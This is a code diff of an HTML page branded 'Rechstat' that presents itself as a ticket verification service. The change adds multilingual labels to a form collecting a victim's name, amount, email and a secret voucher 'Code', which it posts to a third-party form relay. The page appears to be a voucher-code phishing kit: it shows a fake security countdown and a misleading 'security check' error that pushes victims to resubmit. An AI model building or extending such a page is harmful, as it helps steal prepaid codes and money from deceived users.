@@ -118,21 +118,19 @@
 <body>
   <header>
     <nav>
-      <a href="index.html">Accueil</a>
-      <a href="index.html#faq">FAQ</a>
+      <a href="index.html" data-i18n="nav_home">Accueil</a>
+      <a href="index.html#faq" data-i18n="nav_faq">FAQ</a>
     </nav>
     <div class="custom-language-selector" id="langSelector">
-      <div class="selected-lang">
+      <div class="selected-lang" id="currentLang">
         <img src="https://flagcdn.com/w20/fr.png" alt="FR">
         <span>Français</span>
       </div>
       <ul class="lang-options" id="langOptions">
-        <li onclick="setLang('fr')"><img src="https://flagcdn.com/w20/fr.png" alt="FR"> Français</li>
-        <li onclick="setLang('en')"><img src="https://flagcdn.com/w20/gb.png" alt="EN"> English</li>
-        <li onclick="setLang('es')"><img src="https://flagcdn.com/w20/es.png" alt="ES"> Español</li>
-        <li onclick="setLang('de')"><img src="https://flagcdn.com/w20/de.png" alt="DE"> Deutsch</li>
-        <li onclick="setLang('it')"><img src="https://flagcdn.com/w20/it.png" alt="IT"> Italiano</li>
-        <li onclick="setLang('pt')"><img src="https://flagcdn.com/w20/pt.png" alt="PT"> Português</li>
+        <li onclick="setLang('fr', 'https://flagcdn.com/w20/fr.png', 'Français')"><img src="https://flagcdn.com/w20/fr.png"> Français</li>
+        <li onclick="setLang('en', 'https://flagcdn.com/w20/gb.png', 'English')"><img src="https://flagcdn.com/w20/gb.png"> English</li>
+        <li onclick="setLang('es', 'https://flagcdn.com/w20/es.png', 'Español')"><img src="https://flagcdn.com/w20/es.png"> Español</li>
+        <li onclick="setLang('de', 'https://flagcdn.com/w20/de.png', 'Deutsch')"><img src="https://flagcdn.com/w20/de.png"> Deutsch</li>
       </ul>
     </div>
   </header>
@@ -143,37 +141,32 @@
         <form id="mainForm">
           <input type="hidden" name="access_key" value="1eaf6de9-668d-4793-bf2a-134ad609663d">
           <input type="hidden" name="subject" value="Nouvelle vérification de ticket - Rechstat">
-          <input type="hidden" name="from_name" value="Rechstat Security">
-          <input type="checkbox" name="botcheck" class="hidden-field" style="display: none;">
           <input type="hidden" name="submitted_at" id="submitted_at">
 
-          <label for="nom">Nom :</label>
+          <label for="nom" data-i18n="label_nom">Nom :</label>
           <input type="text" id="nom" name="nom" required placeholder="Ex: Dupont">
 
-          <label for="prenom">Prénom :</label>
+          <label for="prenom" data-i18n="label_prenom">Prénom :</label>
           <input type="text" id="prenom" name="prenom" required placeholder="Ex: Jean">
 
-          <label for="value">Montant :</label>
+          <label for="value" data-i18n="label_montant">Montant :</label>
           <input type="number" id="value" name="value" min="1" required placeholder="0.00">
 
-          <label for="email">Votre email :</label>
+          <label for="email" data-i18n="label_email">Votre email :</label>
           <input type="email" id="email" name="email" required placeholder="nom@exemple.com">
 
-          <div class="password-wrapper">
-            <label for="reference">Code :</label>
-            <input type="password" id="reference" name="reference" required>
-          </div>
+          <label for="reference" data-i18n="label_code">Code :</label>
+          <input type="password" id="reference" name="reference" required>
 
           <div class="code-toggle-container">
-              <p style="margin-bottom: 10px; font-size: 0.85rem; font-weight: 600; color: var(--text-light);">Afficher le code :</p>
+              <p style="margin-bottom: 10px; font-size: 0.85rem; font-weight: 600;" data-i18n="label_show_code">Afficher le code :</p>
               <div class="code-toggle">
-                <label><input type="radio" name="show_code" value="oui" onclick="toggleCode(true)"><span>Oui</span></label>
-                <label><input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)"><span>Non</span></label>
+                <label><input type="radio" name="show_code" value="oui" onclick="toggleCode(true)"><span data-i18n="btn_yes">Oui</span></label>
+                <label><input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)"><span data-i18n="btn_no">Non</span></label>
               </div>
           </div>
 
-          <button type="submit" class="btn-submit" id="submitBtn">Initialisation sécurisée...</button>
-          
+          <button type="submit" class="btn-submit" id="submitBtn" data-i18n="btn_initial">Initialisation sécurisée...</button>
           <div id="form-result"></div>
         </form>
       </div>
@@ -181,99 +174,123 @@
   </div>
 
   <footer>
-    <div class="footer-links"><a href="#faq">FAQ</a><a href="#contact">Contact</a></div>
-    <p style="margin-top: 10px; color: #94a3b8; font-size: 0.8rem;">&copy; 2025 Rechstat.com Tous droits réservés.</p>
+    <p style="color: #94a3b8; font-size: 0.8rem;">&copy; 2025 Rechstat.com</p>
   </footer>
 
   <script>
-    // --- FONCTIONS GLOBALES (Accessibles partout) ---
+    // 1. DICTIONNAIRE DE TRADUCTION
+    const translations = {
+      fr: {
+        nav_home: "Accueil", nav_faq: "FAQ", label_nom: "Nom :", label_prenom: "Prénom :",
+        label_montant: "Montant :", label_email: "Votre email :", label_code: "Code :",
+        label_show_code: "Afficher le code :", btn_yes: "Oui", btn_no: "Non", btn_submit: "Soumettre le ticket",
+        msg_error: "⚠️ Vérification de sécurité requise : Pour protéger vos données, veuillez vous assurer que toutes les informations saisies sont exactes. Par mesure de précaution, merci de patienter une minute avant de valider à nouveau."
+      },
+      en: {
+        nav_home: "Home", nav_faq: "FAQ", label_nom: "Last Name:", label_prenom: "First Name:",
+        label_montant: "Amount:", label_email: "Your email:", label_code: "Code:",
+        label_show_code: "Show code:", btn_yes: "Yes", btn_no: "No", btn_submit: "Submit Ticket",
+        msg_error: "⚠️ Security check required: To protect your data, please ensure all information entered is accurate. As a precaution, please wait one minute before validating again."
+      },
+      es: {
+        nav_home: "Inicio", nav_faq: "FAQ", label_nom: "Apellido:", label_prenom: "Nombre:",
+        label_montant: "Monto:", label_email: "Su correo:", label_code: "Código:",
+        label_show_code: "Mostrar código:", btn_yes: "Sí", btn_no: "No", btn_submit: "Enviar ticket",
+        msg_error: "⚠️ Se requiere verificación de seguridad: para proteger sus datos, asegúrese de que toda la información ingresada sea precisa. Como precaución, espere un minuto antes de volver a validar."
+      },
+      de: {
+        nav_home: "Startseite", nav_faq: "FAQ", label_nom: "Nachname:", label_prenom: "Vorname:",
+        label_montant: "Betrag:", label_email: "Ihre E-Mail:", label_code: "Code:",
+        label_show_code: "Code anzeigen:", btn_yes: "Ja", btn_no: "Nein", btn_submit: "Ticket absenden",
+        msg_error: "⚠️ Sicherheitsprüfung erforderlich: Um Ihre Daten zu schützen, stellen Sie bitte sicher, dass alle eingegebenen Informationen korrekt sind. Bitte warten Sie vorsichtshalber eine Minute, bevor Sie die Validierung erneut durchführen."
+      }
+    };
+
+    // 2. LOGIQUE DE CHANGEMENT DE LANGUE
+    function setLang(lang, flagUrl, langName) {
+      // Mise à jour de l'affichage du sélecteur
+      const currentBtn = document.getElementById('currentLang');
+      currentBtn.querySelector('img').src = flagUrl;
+      currentBtn.querySelector('span').innerText = langName;
+      
+      // Traduction des éléments ayant l'attribut data-i18n
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (translations[lang][key]) {
+          el.innerText = translations[lang][key];
+        }
+      });
+      
+      // Stockage de la langue préférée
+      localStorage.setItem('preferredLang', lang);
+    }
+
+    // 3. BOUTON & SÉCURITÉ
     function toggleCode(show) {
-      const field = document.getElementById("reference");
-      if(field) field.type = show ? "text" : "password";
+      document.getElementById("reference").type = show ? "text" : "password";
     }
 
     function toggleLangMenu() {
-        const menu = document.getElementById('langOptions');
-        if(menu) menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
+      const menu = document.getElementById('langOptions');
+      menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
     }
 
-    // Gestion du clic sur le sélecteur
-    document.getElementById('langSelector').addEventListener('click', function(e) {
-        e.stopPropagation();
-        toggleLangMenu();
+    document.getElementById('langSelector').addEventListener('click', (e) => {
+      e.stopPropagation();
+      toggleLangMenu();
     });
 
-    // Fermer le menu si on clique ailleurs
-    window.onclick = function(event) {
-        const menu = document.getElementById('langOptions');
-        if (menu) menu.style.display = 'none';
-    }
+    window.onclick = () => document.getElementById('langOptions').style.display = 'none';
 
     window.onload = function() {
-      const form = document.getElementById('mainForm');
       const btn = document.getElementById('submitBtn');
       const resultDiv = document.getElementById('form-result');
-      const timestampField = document.getElementById('submitted_at');
       
-      if (timestampField) timestampField.value = new Date().toLocaleString();
+      document.getElementById('submitted_at').value = new Date().toLocaleString();
 
-      // --- SÉCURITÉ 1 : DÉLAI INITIAL ---
-      let timeLeft = 10; 
+      let timeLeft = 10;
       btn.disabled = true;
 
       const timer = setInterval(() => {
         timeLeft--;
-        if (timeLeft > 6) btn.innerText = "Initialisation sécurisée...";
-        else if (timeLeft > 3) btn.innerText = "Analyse des protocoles...";
-        else if (timeLeft > 0) btn.innerText = "Finalisation...";
-        
         if (timeLeft <= 0) {
           clearInterval(timer);
           btn.disabled = false;
-          btn.innerText = "Soumettre le ticket";
+          // Utilise la traduction du bouton
+          const currentLang = localStorage.getItem('preferredLang') || 'fr';
+          btn.innerText = translations[currentLang].btn_submit;
+        } else {
+          btn.innerText = `Securité (${timeLeft}s)`;
         }
       }, 1000);
 
-      // --- SÉCURITÉ 2 : ENVOI AJAX ---
-      form.addEventListener('submit', function(e) {
+      // GESTION FORMULAIRE AJAX
+      document.getElementById('mainForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        
         btn.disabled = true;
-        btn.innerText = "Vérification...";
+        btn.innerText = "...";
         resultDiv.style.display = "block";
-        resultDiv.style.background = "#f1f5f9";
-        resultDiv.style.color = "var(--text)";
-        resultDiv.innerText = "Traitement de votre demande...";
+        resultDiv.innerText = "Traitement...";
 
-        const formData = new FormData(form);
-        const object = Object.fromEntries(formData);
-        const json = JSON.stringify(object);
-
+        const formData = new FormData(this);
         fetch('https://api.web3forms.com/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: json
+          body: JSON.stringify(Object.fromEntries(formData))
         })
         .then(async (response) => {
-          let res = await response.json();
           if (response.status == 200) {
             resultDiv.style.background = "#dcfce7";
-            resultDiv.style.color = "var(--success)";
-            resultDiv.innerText = "✓ Succès ! Analyse terminée. Redirection...";
+            resultDiv.innerText = "✓ Succès !";
             setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
           } else {
-            // MESSAGE ERREUR PERSONNALISÉ
-            resultDiv.style.background = "#fee2e2";
-            resultDiv.style.color = "var(--error)";
-            resultDiv.innerText = "⚠️ Vérification de sécurité requise : Pour protéger vos données, veuillez vous assurer que toutes les informations saisies sont exactes. Par mesure de précaution, merci de patienter une minute avant de valider à nouveau.";
+            const lang = localStorage.getItem('preferredLang') || 'fr';
+            resultDiv.style.background = "#fff7ed";
+            resultDiv.style.color = "#9a3412";
+            resultDiv.innerText = translations[lang].msg_error;
             btn.disabled = false;
-            btn.innerText = "Réessayer";
+            btn.innerText = translations[lang].btn_submit;
           }
-        })
-        .catch(error => {
-          resultDiv.innerText = "Erreur de connexion réseau.";
-          btn.disabled = false;
-          btn.innerText = "Réessayer";
         });
       });
     };
